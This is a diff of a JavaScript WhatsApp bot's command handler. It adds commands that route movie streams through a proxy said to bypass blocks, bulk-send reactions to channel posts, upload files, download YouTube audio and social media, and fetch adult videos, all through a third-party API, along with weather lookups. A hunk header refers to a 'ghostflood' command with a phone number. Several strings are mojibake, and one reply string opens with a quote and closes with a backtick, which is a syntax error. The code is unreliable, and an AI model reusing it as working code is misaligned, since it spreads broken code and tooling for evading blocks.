+            if (data.season) apiUrl += `&season=${data.season}`;
+            if (data.episode) apiUrl += `&episode=${data.episode}`;
+            apiUrl += `&quality=${quality}`;
+
+            const response = await axios.get(apiUrl, {
+                timeout: 20000,
+                headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
+            });
+
+            if (!response.data) {
+                return reply('No stream URL returned.');
+            }
+
+            const streamData = response.data;
+            const streamUrl = streamData.streamUrl || streamData.url || streamData.directUrl || null;
+
+            if (!streamUrl) {
+                return reply(`Could not extract stream URL.`);
+            }
+
+            let msg =
+`Title: ${data.title}
+Quality: ${quality}`;
+
+            if (data.season) msg += `\nSeason: ${data.season}`;
+            if (data.episode) msg += `\nEpisode: ${data.episode}`;
+
+            msg += `\n\nStream Link: ${streamUrl}`;
+
+            await reply(msg);
+
+        } catch (err) {
+            reply(`Stream fetch failed: ${err.message || 'Unknown error'}`);
+        }
+        return;
+    }
+
+    // PROXY
+    if (action === 'proxy') {
+        const videoUrl = params[0];
+        const quality = params[1] || '720p';
+
+        if (!videoUrl || !videoUrl.includes('http')) {
+            return reply(`Usage: ${prefix}mb proxy <video_url> [quality]`);
+        }
+
+        await reply(`Proxying video...`);
+
+        try {
+            const apiUrl = `https://omegatech-api.dixonomega.tech/api/movie/MovieBox-proxy?action=proxy&videoUrl=${encodeURIComponent(videoUrl)}&quality=${quality}`;
+            const response = await axios.get(apiUrl, {
+                timeout: 20000,
+                headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
+            });
+
+            if (!response.data) {
+                return reply('No response from proxy API.');
+            }
+
+            const proxyData = response.data;
+            const proxyUrl = proxyData.proxyUrl || proxyData.url || proxyData.streamUrl || null;
+
+            if (!proxyUrl) {
+                return reply(`Could not extract proxied URL.`);
+            }
+
+            reply(`Proxied Stream URL:\n\n${proxyUrl}\n\nQuality: ${quality}\nThis link bypasses blocks.`);
+
+        } catch (err) {
+            reply(`Proxy failed: ${err.message || 'Unknown error'}`);
+        }
+        return;
+    }
+
+    // Invalid action
+    reply(`Unknown action: ${action}\nUse ${prefix}mb without parameters for help.`);
+    break;
+}
+
+case 'reactchannel':
+case 'rc': {
+    if (!text) {
+        return reply(
+`REACT TO CHANNEL POST
+
+Usage: ${prefix}reactchannel <url> <emojis>
+
+Parameters:
+  url     - WhatsApp channel post URL
+  emojis  - Comma-separated list of emojis
+
+Examples:
+  ${prefix}reactchannel https://whatsapp.com/channel/... ❤️,🔥,👍
+  ${prefix}reactchannel https://whatsapp.com/channel/... 😂,💀,👏
+
+Note: Multiple emojis will be sent one by one with retries.`
+        );
+    }
+
+    const args = text.trim().split(/\s+/);
+    const url = args[0];
+    const emojis = args.slice(1).join('').split(',').map(e => e.trim()).filter(e => e);
+
+    if (!url || !url.includes('whatsapp.com/channel')) {
+        return reply('Invalid URL. Please provide a valid WhatsApp channel post URL.');
+    }
+
+    if (emojis.length === 0) {
+        return reply('Please provide at least one emoji. Example: ❤️,🔥,👍');
+    }
+
+    await reply(`Sending reactions to channel post...\nEmojis: ${emojis.join(', ')}`);
+
+    try {
+        const apiUrl = `https://omegatech-api.dixonomega.tech/api/tools/react-channel?url=${encodeURIComponent(url)}&emojis=${encodeURIComponent(emojis.join(','))}`;
+
+        const response = await axios.get(apiUrl, {
+            timeout: 60000,
+            headers: {
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+            }
+        });
+
+        if (!response.data) {
+            return reply('No response from the API.');
+        }
+
+        const data = response.data;
+        let resultMsg = 'Reaction results:\n\n';
+
+        if (data.success) {
+            resultMsg += 'Status: Success\n';
+        } else {
+            resultMsg += 'Status: Failed\n';
+        }
+
+        if (data.message) {
+            resultMsg += `Message: ${data.message}\n`;
+        }
+
+        if (data.sent) {
+            resultMsg += `Sent: ${data.sent}\n`;
+        }
+
+        if (data.failed) {
+            resultMsg += `Failed: ${data.failed}\n`;
+        }
+
+        if (data.results && Array.isArray(data.results)) {
+            data.results.forEach((r, i) => {
+                const emoji = emojis[i] || 'unknown';
+                resultMsg += `\n${emoji}: ${r.success ? 'Success' : 'Failed'}`;
+                if (r.error) resultMsg += ` (${r.error})`;
+            });
+        }
+
+        // If there's a next available time
+        if (data.next_time) {
+            resultMsg += `\n\nNext available: ${data.next_time}`;
+        }
+
+        await reply(resultMsg);
+
+    } catch (err) {
+        console.error('React channel error:', err);
+        let errorMsg = `Reaction failed: ${err.message || 'Unknown error'}`;
+        if (err.code === 'ECONNABORTED') {
+            errorMsg = 'Request timed out. The server may be busy.';
+        } else if (err.response) {
+            const apiError = err.response.data?.message || err.response.data?.error || err.response.statusText;
+            if (apiError) errorMsg = `Reaction failed: ${apiError}`;
+        }
+        await reply(errorMsg);
+    }
+    break;
+}
+
+
+case 'upload':
+case 'up': {
+    if (!text) {
+        return reply(
+`UPLOAD COMMANDS
+
+Usage: ${prefix}upload <provider> [options]
+
+Providers:
+  catbox    - Upload to Catbox (permanent CDN)
+  soonex    - Upload to Soonex (fast CDN)
+  both      - Upload to both Catbox and Soonex
+  cloud     - Upload to Cloudinary
+  postimage - Upload to PostImages
+
+Examples:
+  ${prefix}upload catbox (reply to media)
+  ${prefix}upload both
+  ${prefix}upload cloud
+
+Reply to an image, video, audio, or document. Max 200MB.`
+        );
+    }
+
+    const args = text.trim().split(/\s+/);
+    const provider = args[0].toLowerCase();
+    const validProviders = ['catbox', 'soonex', 'both', 'cloud', 'postimage'];
+
+    if (!validProviders.includes(provider)) {
+        return reply(`Invalid provider. Use: catbox, soonex, both, cloud, or postimage`);
+    }
+
+    // Get quoted message
+    const quoted = m.quoted || m;
+    const mime = quoted.mimetype || '';
+
+    if (!mime) {
+        return reply(`Reply to a media file (image, video, audio, or document).`);
+    }
+
+    try {
+        await reply(`Uploading file to ${provider}...`);
+
+        // Download media
+        const mediaBuffer = await empire.downloadMediaMessage(quoted);
+        if (!mediaBuffer || mediaBuffer.length < 100) {
+            return reply('Failed to download media.');
+        }
+
+        if (mediaBuffer.length > 200 * 1024 * 1024) {
+            return reply('File too large. Max 200MB.');
+        }
+
+        // Build FormData
+        const form = new FormData();
+        const fileName = quoted.fileName || `file_${Date.now()}`;
+        const blob = new Blob([mediaBuffer], { type: mime || 'application/octet-stream' });
+        form.append('file', blob, fileName);
+
+        // Upload endpoint mapping
+        const endpoints = {
+            catbox: 'https://omegatech-api.dixonomega.tech/api/tools/uploader?provider=catbox',
+            soonex: 'https://omegatech-api.dixonomega.tech/api/tools/uploader?provider=soonex',
+            both: 'https://omegatech-api.dixonomega.tech/api/tools/uploader?provider=both',
+            cloud: 'https://omegatech-api.dixonomega.tech/api/tools/upload',
+            postimage: 'https://omegatech-api.dixonomega.tech/api/tools/upload-postimage'
+        };
+
+        const apiUrl = endpoints[provider];
+        const response = await axios.post(apiUrl, form, {
+            headers: {
+                ...form.getHeaders(),
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+            },
+            timeout: 120000
+        });
+
+        if (!response.data) {
+            return reply('No response from upload service.');
+        }
+
+        // Parse response
+        const data = response.data;
+        let resultMsg = `Upload successful!\n\nProvider: ${provider}\nFile: ${fileName}\nSize: ${(mediaBuffer.length / 1024 / 1024).toFixed(2)} MB\n\n`;
+
+        if (data.url) {
+            resultMsg += `URL: ${data.url}\n`;
+        } else if (data.urls) {
+            if (data.urls.catbox) resultMsg += `Catbox: ${data.urls.catbox}\n`;
+            if (data.urls.soonex) resultMsg += `Soonex: ${data.urls.soonex}\n`;
+        } else if (data.result) {
+            if (data.result.url) resultMsg += `URL: ${data.result.url}\n`;
+            if (data.result.urls) {
+                if (data.result.urls.catbox) resultMsg += `Catbox: ${data.result.urls.catbox}\n`;
+                if (data.result.urls.soonex) resultMsg += `Soonex: ${data.result.urls.soonex}\n`;
+            }
+        } else if (data.data) {
+            if (data.data.url) resultMsg += `URL: ${data.data.url}\n`;
+            if (data.data.urls) {
+                if (data.data.urls.catbox) resultMsg += `Catbox: ${data.data.urls.catbox}\n`;
+                if (data.data.urls.soonex) resultMsg += `Soonex: ${data.data.urls.soonex}\n`;
+            }
+        } else {
+            // Fallback - show raw response
+            resultMsg += `Response:\n${JSON.stringify(data, null, 2)}`;
+        }
+
+        await reply(resultMsg);
+
+    } catch (err) {
+        console.error('Upload error:', err);
+        let errorMsg = `Upload failed: ${err.message || 'Unknown error'}`;
+        if (err.code === 'ECONNABORTED') {
+            errorMsg = 'Upload timed out. The file may be too large or the server is slow.';
+        } else if (err.response) {
+            const apiError = err.response.data?.message || err.response.data?.error || err.response.statusText;
+            if (apiError) errorMsg = `Upload failed: ${apiError}`;
+        }
+        await reply(errorMsg);
+    }
+    break;
+}
         // ═══════════════════════════════════════════════════
         // TWITTER/X DOWNLOAD
         // ═══════════════════════════════════════════════════
@@ -2129,197 +3065,321 @@ ${prefix}ghostflood 2347059886720 3
         // PLAY - Download song from YouTube
         // ═══════════════════════════════════════════════════
         case 'play':
-        case 'song':
-        case 'ytmp3': {
-            if (!text) return reply(`🎵 Usage: ${prefix}play <song name or URL>\nExample: ${prefix}play Khai With You`);
-            await reply('🔍 Searching and processing...');
+case 'song':
+case 'ytmp3': {
+    if (!text) return reply(`Usage: ${prefix}play <song name or URL>\nExample: ${prefix}play Khai With You`);
+    await reply('Қ Searching and processing...');
+
+    try {
+        let videoUrl = text;
+        let videoTitle = '';
+        let thumbnail = '';
+
+        // -- Detect if input is a YouTube link --
+        if (text.includes('youtube.com') || text.includes('youtu.be')) {
+            const videoId = text.match(/(?:v=|youtu\.be\/)([a-zA-Z0-9_-]{11})/)?.[1];
+            if (videoId) {
+                try {
+                    const search = await yts({ videoId });
+                    if (search) {
+                        videoTitle = search.title || 'YouTube Audio';
+                        thumbnail = search.thumbnail || '';
+                    }
+                } catch (e) {}
+            }
+            if (!videoTitle) videoTitle = 'YouTube Audio';
+            // Keep the URL as-is
+        } else {
+            // -- Search for the song --
+            const search = await yts(text);
+            if (!search || !search.videos?.length) {
+                return reply('No results found for your query.');
+            }
+            const video = search.videos[0];
+            videoUrl = video.url;
+            videoTitle = video.title || 'YouTube Audio';
+            thumbnail = video.thumbnail || '';
+        }
+
+        // -- Send thumbnail preview (optional) --
+        if (thumbnail) {
+            await empire.sendMessage(m.chat, {
+                image: { url: thumbnail },
+                caption: `*Downloading:* ${videoTitle}\nвҸұ Please wait...`
+            }, { quoted: m });
+        }
+
+        // -- Call the OmegaTech API --
+        const apiUrl = `https://omegatech-api.dixonomega.tech/api/download/play?url=${encodeURIComponent(videoUrl)}`;
+        const response = await axios.get(apiUrl, {
+            timeout: 30000,
+            headers: {
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+            }
+        });
+
+        // -- Parse response (try common fields) --
+        let downloadUrl = null;
+        let finalTitle = videoTitle;
+
+        if (response.data) {
+            const data = response.data;
+            // The API might return a direct download URL in various keys
+            downloadUrl = data.download_url || data.download || data.url || data.result?.download_url || data.result?.download;
+            if (data.title) finalTitle = data.title;
+            else if (data.result?.title) finalTitle = data.result.title;
+        }
+
+        if (!downloadUrl) {
+            return reply('The API did not return a valid download URL. Please try another song.');
+        }
+
+        // -- Download the audio --
+        const audioResponse = await axios.get(downloadUrl, {
+            responseType: 'arraybuffer',
+            timeout: 120000,
+            maxContentLength: Infinity,
+            maxBodyLength: Infinity,
+            headers: {
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+                'Accept': '*/*'
+            }
+        });
+
+        let audioBuffer = Buffer.from(audioResponse.data);
+        if (!audioBuffer || audioBuffer.length < 1000) {
+            return reply(' Downloaded audio file is too small or corrupted.');
+        }
+
+        // -- Check if it's already MP3; if not, try to convert --
+        const isMP3 = audioBuffer.toString('ascii', 0, 3) === 'ID3' ||
+                     (audioBuffer[0] === 0xFF && (audioBuffer[1] & 0xE0) === 0xE0);
+        if (!isMP3) {
+            try {
+                // Determine format from headers or extension
+                let format = 'm4a';
+                const header = audioBuffer.toString('ascii', 0, 4);
+                if (header === 'OggS') format = 'ogg';
+                else if (header === 'RIFF') format = 'wav';
+                else if (header === 'ftyp') format = 'mp4';
+                // If it's still not recognized, we can try to force convert using toAudio
+                const converted = await toAudio(audioBuffer, format);
+                if (converted && converted.length > 1000) {
+                    audioBuffer = converted;
+                }
+            } catch (convErr) {
+                console.warn('Conversion skipped:', convErr.message);
+            }
+        }
+
+        const safeTitle = (finalTitle || 'audio').replace(/[^\w\s-]/g, '');
+
+        // -- Send the audio --
+        try {
+            await empire.sendMessage(m.chat, {
+                audio: audioBuffer,
+                mimetype: 'audio/mpeg',
+                fileName: `${safeTitle}.mp3`,
+                ptt: false,
+                contextInfo: newsletterContext()
+            }, { quoted: m });
+        } catch (sendErr) {
+            // Fallback: send as document if audio fails
+            await empire.sendMessage(m.chat, {
+                document: audioBuffer,
+                mimetype: 'audio/mpeg',
+                fileName: `${safeTitle}.mp3`,
+                caption: `рҹҺµ *${safeTitle}*\n\nвҡ пёҸ Sent as file due to playback issues.`,
+                contextInfo: newsletterContext()
+            }, { quoted: m });
+        }
+
+    } catch (err) {
+        console.error('Play command error:', err);
+        reply(` Failed to download: ${err.message || 'Unknown error'}`);
+    }
+    break;
+}
+       case 'alldl':
+case 'all':
+case 'universal':
+case 'downloadall': {
+    if (!text) return reply(`Usage: ${prefix}alldl <URL>\nExample: ${prefix}alldl https://www.tiktok.com/@user/video/123456789\n\n *Supported platforms:* TikTok, Instagram, Twitter/X, Facebook, YouTube, Snapchat, and more.`);
+    await reply('Processing your link...');
+
+    try {
+        const apiUrl = `https://omegatech-api.dixonomega.tech/api/download/all?url=${encodeURIComponent(text)}`;
+        const response = await axios.get(apiUrl, {
+            timeout: 45000,
+            headers: {
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+            }
+        });
+
+        if (!response.data) {
+            return reply(' No response from the API. The link might be unsupported or the service is down.');
+        }
+
+        const data = response.data;
+        let downloadUrls = [];
+        let title = 'Media';
+        let thumbnail = null;
+        let isVideo = false;
+
+        // -- Parse different response structures --
+        if (data.success && data.result) {
+            const result = data.result;
+            title = result.title || result.caption || 'Media';
+            thumbnail = result.thumbnail || result.cover || null;
+
+            if (result.video || result.videos) {
+                isVideo = true;
+                if (Array.isArray(result.videos) && result.videos.length > 0) {
+                    downloadUrls = result.videos.map(v => v.url || v).filter(Boolean);
+                } else if (result.video) {
+                    downloadUrls = [result.video];
+                } else if (result.download) {
+                    downloadUrls = [result.download];
+                }
+            } else if (result.images && Array.isArray(result.images)) {
+                downloadUrls = result.images.map(img => img.url || img).filter(Boolean);
+            } else if (result.audio || result.music) {
+                downloadUrls = [result.audio || result.music];
+            } else if (result.url) {
+                downloadUrls = [result.url];
+            } else if (result.download_url) {
+                downloadUrls = [result.download_url];
+            }
+        } else if (data.data) {
+            const result = data.data;
+            title = result.title || result.caption || 'Media';
+            thumbnail = result.thumbnail || result.cover || null;
+            if (result.video) { isVideo = true; downloadUrls = [result.video]; }
+            else if (result.images) { downloadUrls = result.images; }
+            else if (result.url) { downloadUrls = [result.url]; }
+            else if (result.download) { downloadUrls = [result.download]; }
+        } else {
+            // Fallback: try to find any URL in the response
+            const possibleKeys = ['download', 'download_url', 'url', 'video', 'image', 'audio', 'music'];
+            for (const key of possibleKeys) {
+                if (data[key]) {
+                    if (Array.isArray(data[key])) downloadUrls = data[key].filter(Boolean);
+                    else downloadUrls = [data[key]];
+                    break;
+                }
+            }
+            if (downloadUrls.length === 0) {
+                return reply(' Could not extract download links from the API response. The platform might not be supported.');
+            }
+        }
+
+        // -- Handle no URLs found --
+        if (downloadUrls.length === 0) {
+            return reply(' No downloadable media found for this URL.');
+        }
+
+        // -- Send thumbnail (if available) --
+        if (thumbnail) {
+            try {
+                await empire.sendMessage(m.chat, {
+                    image: { url: thumbnail },
+                    caption: ` *${title}*\n\nрҹ“Ұ *Total files:* ${downloadUrls.length}\nрҹ”„ *Downloading and sending...*`,
+                    contextInfo: newsletterContext()
+                }, { quoted: m });
+            } catch (e) {}
+        }
+
+        // -- Send each media file --
+        for (let i = 0; i < Math.min(downloadUrls.length, 10); i++) {
+            const url = downloadUrls[i];
+            if (!url) continue;
 
             try {
-                let videoUrl = text;
-                let videoTitle = '';
-                let thumbnail = '';
-
-                if (text.includes('youtube.com') || text.includes('youtu.be')) {
-                    const videoId = text.match(/(?:v=|youtu\.be\/)([a-zA-Z0-9_-]{11})/)?.[1];
-                    if (videoId) {
-                        try {
-                            const search = await yts({ videoId });
-                            if (search) {
-                                videoTitle = search.title || 'YouTube Audio';
-                                thumbnail = search.thumbnail || '';
-                            }
-                        } catch (e) {}
-                    }
-                    if (!videoTitle) videoTitle = 'YouTube Audio';
-                    videoUrl = text;
-                } else {
-                    const search = await yts(text);
-                    if (!search || !search.videos?.length) {
-                        return reply('❌ No results found for your query.');
-                    }
-                    const video = search.videos[0];
-                    videoUrl = video.url;
-                    videoTitle = video.title || 'YouTube Audio';
-                    thumbnail = video.thumbnail || '';
-                }
-
-                if (thumbnail) {
-                    await empire.sendMessage(m.chat, {
-                        image: { url: thumbnail },
-                        caption: `🎵 *Downloading:* ${videoTitle}\n⏱ *Please wait...*`
-                    }, { quoted: m });
-                }
-
-                let audioData = null;
-                let usedApi = '';
-
-                const apiMethods = [
-                    {
-                        name: 'Prince Techno',
-                        method: async () => {
-                            const apiUrl = `https://api.princetechn.com/api/download/ytmp3?apikey=prince&url=${encodeURIComponent(videoUrl)}`;
-                            const response = await axios.get(apiUrl, {
-                                timeout: 30000,
-                                headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
-                            });
-                            if (response.data) {
-                                if (response.data.download_url || response.data.download) {
-                                    return { download: response.data.download_url || response.data.download, title: response.data.title || videoTitle };
-                                }
-                                if (response.data.data) {
-                                    const data = response.data.data;
-                                    return { download: data.download_url || data.download || data.url, title: data.title || videoTitle };
-                                }
-                                if (response.data.result) {
-                                    const result = response.data.result;
-                                    return { download: result.download_url || result.download || result.url, title: result.title || videoTitle };
-                                }
-                            }
-                            throw new Error('Prince API returned invalid data');
-                        }
-                    },
-                    {
-                        name: 'EliteProTech',
-                        method: async () => {
-                            const apiUrl = `https://eliteprotech-apis.zone.id/ytdown?url=${encodeURIComponent(videoUrl)}&format=mp3`;
-                            const response = await axios.get(apiUrl, { timeout: 30000 });
-                            if (response?.data?.success && response?.data?.downloadURL) {
-                                return { download: response.data.downloadURL, title: response.data.title || videoTitle };
-                            }
-                            throw new Error('EliteProTech failed');
-                        }
-                    },
-                    {
-                        name: 'Yupra',
-                        method: async () => {
-                            const apiUrl = `https://api.yupra.my.id/api/downloader/ytmp3?url=${encodeURIComponent(videoUrl)}`;
-                            const response = await axios.get(apiUrl, { timeout: 30000 });
-                            if (response?.data?.success && response?.data?.data?.download_url) {
-                                return { download: response.data.data.download_url, title: response.data.data.title || videoTitle };
-                            }
-                            throw new Error('Yupra failed');
-                        }
-                    },
-                    {
-                        name: 'Shizo',
-                        method: async () => {
-                            const apiUrl = `https://api.shizo.top/downloader/ytmp3?apikey=shizo&url=${encodeURIComponent(videoUrl)}`;
-                            const response = await axios.get(apiUrl, { timeout: 30000 });
-                            if (response?.data?.status && response?.data?.result?.download) {
-                                return { download: response.data.result.download, title: response.data.result.title || videoTitle };
-                            }
-                            throw new Error('Shizo failed');
-                        }
-                    }
-                ];
-
-                for (const apiMethod of apiMethods) {
-                    try {
-                        const result = await apiMethod.method();
-                        if (result && result.download) {
-                            audioData = result;
-                            usedApi = apiMethod.name;
-                            break;
-                        }
-                    } catch (err) {}
-                }
-
-                if (!audioData || !audioData.download) {
-                    return reply('❌ All download sources failed. Please try another song or try again later.');
-                }
-
-                const audioResponse = await axios.get(audioData.download, {
+                const mediaResponse = await axios.get(url, {
                     responseType: 'arraybuffer',
-                    timeout: 120000,
+                    timeout: 90000,
                     maxContentLength: Infinity,
                     maxBodyLength: Infinity,
                     headers: {
-                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                         'Accept': '*/*'
                     }
                 });
 
-                let audioBuffer = Buffer.from(audioResponse.data);
-
-                if (!audioBuffer || audioBuffer.length < 1000) {
-                    return reply('❌ Downloaded audio file is too small or corrupted.');
+                let mediaBuffer = Buffer.from(mediaResponse.data);
+                if (!mediaBuffer || mediaBuffer.length < 1000) {
+                    await reply(` File ${i+1} is too small or corrupted.`);
+                    continue;
                 }
 
-                const isMP3 = audioBuffer.toString('ascii', 0, 3) === 'ID3' ||
-                             (audioBuffer[0] === 0xFF && (audioBuffer[1] & 0xE0) === 0xE0);
+                const ext = url.split('.').pop().split('?')[0] || 'mp4';
+                const isImage = ['jpg', 'jpeg', 'png', 'gif', 'webp'].includes(ext.toLowerCase());
+                const isVideo = ['mp4', 'webm', 'mkv', 'mov'].includes(ext.toLowerCase());
+                const isAudio = ['mp3', 'm4a', 'ogg', 'wav'].includes(ext.toLowerCase());
 
-                if (!isMP3) {
-                    try {
-                        let format = 'm4a';
-                        const header = audioBuffer.toString('ascii', 0, 4);
-                        if (header === 'OggS') format = 'ogg';
-                        else if (header === 'RIFF') format = 'wav';
-                        else if (header === 'ftyp') format = 'mp4';
+                const caption = `рҹ“Ҙ *${title}* (${i+1}/${downloadUrls.length})`;
 
-                        const converted = await toAudio(audioBuffer, format);
-                        if (converted && converted.length > 1000) {
-                            audioBuffer = converted;
-                        }
-                    } catch (convErr) {}
-                }
-
-                const title = (audioData.title || videoTitle || 'audio').replace(/[^\w\s-]/g, '');
-
-                try {
+                if (isImage) {
                     await empire.sendMessage(m.chat, {
-                        audio: audioBuffer,
-                        mimetype: 'audio/mpeg',
-                        fileName: `${title}.mp3`,
-                        ptt: false,
+                        image: mediaBuffer,
+                        caption: caption,
                         contextInfo: newsletterContext()
                     }, { quoted: m });
-                } catch (sendErr) {
+                } else if (isVideo) {
                     try {
                         await empire.sendMessage(m.chat, {
-                            audio: audioBuffer,
-                            mimetype: 'audio/ogg; codecs=opus',
-                            ptt: true,
-                            fileName: `${title}.ogg`,
+                            video: mediaBuffer,
+                            caption: caption,
                             contextInfo: newsletterContext()
                         }, { quoted: m });
-                    } catch (pttErr) {
+                    } catch (videoErr) {
+                        // Fallback: send as document
                         await empire.sendMessage(m.chat, {
-                            document: audioBuffer,
-                            mimetype: 'audio/mpeg',
-                            fileName: `${title}.mp3`,
-                            caption: `🎵 *${title}*\n\n⚠️ Audio sent as document due to playback issues.`,
+                            document: mediaBuffer,
+                            mimetype: 'video/mp4',
+                            fileName: `${title}_${Date.now()}.${ext}`,
+                            caption: caption,
                             contextInfo: newsletterContext()
                         }, { quoted: m });
                     }
+                } else if (isAudio) {
+                    await empire.sendMessage(m.chat, {
+                        audio: mediaBuffer,
+                        mimetype: 'audio/mpeg',
+                        fileName: `${title}_${Date.now()}.${ext}`,
+                        ptt: false,
+                        contextInfo: newsletterContext()
+                    }, { quoted: m });
+                } else {
+                    await empire.sendMessage(m.chat, {
+                        document: mediaBuffer,
+                        fileName: `${title}_${Date.now()}.${ext}`,
+                        caption: caption,
+                        contextInfo: newsletterContext()
+                    }, { quoted: m });
                 }
 
-            } catch (err) {
-                console.error('Play command error:', err);
-                reply(`❌ Failed to download: ${err.message || 'Unknown error'}`);
+                // -- Small delay between multiple files --
+                if (i < downloadUrls.length - 1) {
+                    await new Promise(resolve => setTimeout(resolve, 1000));
+                }
+
+            } catch (fileErr) {
+                console.error(`Error downloading file ${i+1}:`, fileErr);
+                await reply(` Failed to download file ${i+1}.`);
             }
-            break;
         }
-       
+
+        if (downloadUrls.length > 10) {
+            await reply('Only the first 10 files were sent. There are ${downloadUrls.length} total.`);
+        }
+
+    } catch (err) {
+        console.error('Universal download error:', err);
+        reply(` *Download failed:* ${err.message || 'Unknown error'}`);
+    }
+    break;
+}
         // ═══════════════════════════════════════════════════
         // SETGCNAME - Set group name
         // ═══════════════════════════════════════════════════
@@ -2484,7 +3544,116 @@ ${adminList}`,
             reply("🔓 *Group unlocked!* Everyone can send messages now.");
             break;
         }
+case 'nudesmovie':
+case 'nm':
+case 'nudesdl': {
+    if (!text) return reply(` *NudesMovie Downloader*\n\nUsage: ${prefix}nudesmovie <URL>\nExample: ${prefix}nudesmovie https://nudesmovie.com/watch/abc123\n\nFetches the video and its metadata.`);
+    await reply('рҹ”Қ Processing NudesMovie link...');
 
+    try {
+        const apiUrl = `https://omegatech-api.dixonomega.tech/api/download/nudesmoviedl?url=${encodeURIComponent(text)}`;
+        const response = await axios.get(apiUrl, {
+            timeout: 30000,
+            headers: {
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+            }
+        });
+
+        if (!response.data) {
+            return reply(' No response from the API. The link might be invalid or the service is down.');
+        }
+
+        const data = response.data;
+        let videoUrl = null;
+        let title = 'NudesMovie Video';
+        let thumbnail = null;
+        let metadata = '';
+
+        // -- Parse different response structures --
+        if (data.success && data.result) {
+            const result = data.result;
+            videoUrl = result.video || result.download || result.url || null;
+            title = result.title || result.caption || 'NudesMovie Video';
+            thumbnail = result.thumbnail || result.cover || null;
+            if (result.metadata) {
+                metadata = result.metadata;
+            }
+        } else if (data.data) {
+            const result = data.data;
+            videoUrl = result.video || result.download || result.url || null;
+            title = result.title || result.caption || 'NudesMovie Video';
+            thumbnail = result.thumbnail || result.cover || null;
+        } else {
+            // Fallback: try to find any URL in the response
+            videoUrl = data.video || data.download || data.url || null;
+            title = data.title || 'NudesMovie Video';
+            thumbnail = data.thumbnail || data.cover || null;
+        }
+
+        if (!videoUrl) {
+            return reply(' Could not extract a video download URL from the API response.');
+        }
+
+        // -- Send thumbnail if available --
+        if (thumbnail) {
+            try {
+                await empire.sendMessage(m.chat, {
+                    image: { url: thumbnail },
+                    caption: ` *${title}*\n\nрҹ”„ Downloading video...`,
+                    contextInfo: newsletterContext()
+                }, { quoted: m });
+            } catch (e) {}
+        }
+
+        // -- Download the video --
+        const videoResponse = await axios.get(videoUrl, {
+            responseType: 'arraybuffer',
+            timeout: 120000,
+            maxContentLength: Infinity,
+            maxBodyLength: Infinity,
+            headers: {
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                'Accept': '*/*'
+            }
+        });
+
+        let videoBuffer = Buffer.from(videoResponse.data);
+        if (!videoBuffer || videoBuffer.length < 10000) {
+            return reply('Downloaded video file is too small or corrupted.');
+        }
+
+        const fileSizeMB = (videoBuffer.length / 1024 / 1024).toFixed(1);
+        const caption =
+`рҹҺ¬ *${title}*
+
+рҹ“Ұ *Size:* ${fileSizeMB} MB
+рҹ”— *Source:* ${text}
+
+${metadata ? ` *Metadata:*\n${metadata}` : ''}`;
+
+        try {
+            await empire.sendMessage(m.chat, {
+                video: videoBuffer,
+                caption: caption,
+                contextInfo: newsletterContext()
+            }, { quoted: m });
+        } catch (sendErr) {
+            // Fallback: send as document
+            await empire.sendMessage(m.chat, {
+                document: videoBuffer,
+                mimetype: 'video/mp4',
+                fileName: `${title.replace(/[^a-zA-Z0-9]/g, '_')}.mp4`,
+                caption: caption,
+                contextInfo: newsletterContext()
+            }, { quoted: m });
+        }
+
+    } catch (err) {
+        console.error('NudesMovie download error:', err);
+        reply(`*Download failed:* ${err.message || 'Unknown error'}`);
+    }
+    break;
+}
         // ═══════════════════════════════════════════════════
         // ADD - add a participant by number
         // ═══════════════════════════════════════════════════
@@ -2979,6 +4148,109 @@ ${adminList}`,
             break;
         }
 
+        // ═══════════════════════════════════════════════════
+        // WEATHER (Open-Meteo — free, no API key required)
+        // ═══════════════════════════════════════════════════
+        case 'weather': {
+            if (!text) return reply(`Usage: ${prefix}weather <city name>`);
+            try {
+                const geoRes = await axios.get('https://geocoding-api.open-meteo.com/v1/search', {
+                    params: { name: text, count: 1 },
+                    timeout: 15000
+                });
+                const place = geoRes.data?.results?.[0];
+                if (!place) return reply(`❌ Couldn't find a location called *${text}*.`);
+
+                const wRes = await axios.get('https://api.open-meteo.com/v1/forecast', {
+                    params: {
+                        latitude: place.latitude,
+                        longitude: place.longitude,
+                        current: 'temperature_2m,relative_humidity_2m,wind_speed_10m,weather_code',
+                        timezone: 'auto'
+                    },
+                    timeout: 15000
+                });
+                const c = wRes.data.current;
+                const codes = { 0: '☀️ Clear', 1: '🌤️ Mostly clear', 2: '⛅ Partly cloudy', 3: '☁️ Overcast', 45: '🌫️ Fog', 48: '🌫️ Fog', 51: '🌦️ Light drizzle', 61: '🌧️ Rain', 63: '🌧️ Rain', 65: '🌧️ Heavy rain', 71: '🌨️ Snow', 80: '🌦️ Showers', 95: '⛈️ Thunderstorm' };
+                const desc = codes[c.weather_code] || '🌡️ Unknown';
+
+                reply(
+`🌍 *Weather in ${place.name}, ${place.country}*
+
+${desc}
+🌡️ *Temp:* ${c.temperature_2m}°C
+💧 *Humidity:* ${c.relative_humidity_2m}%
+💨 *Wind:* ${c.wind_speed_10m} km/h`
+                );
+            } catch (err) {
+                reply(`❌ *Weather lookup failed:* ${err.message || 'Unknown error'}`);
+            }
+            break;
+        }
+
+        // ═══════════════════════════════════════════════════
+        // DICTIONARY / DEFINE (dictionaryapi.dev — free, no API key)
+        // ═══════════════════════════════════════════════════
+        case 'define':
+        case 'dictionary':
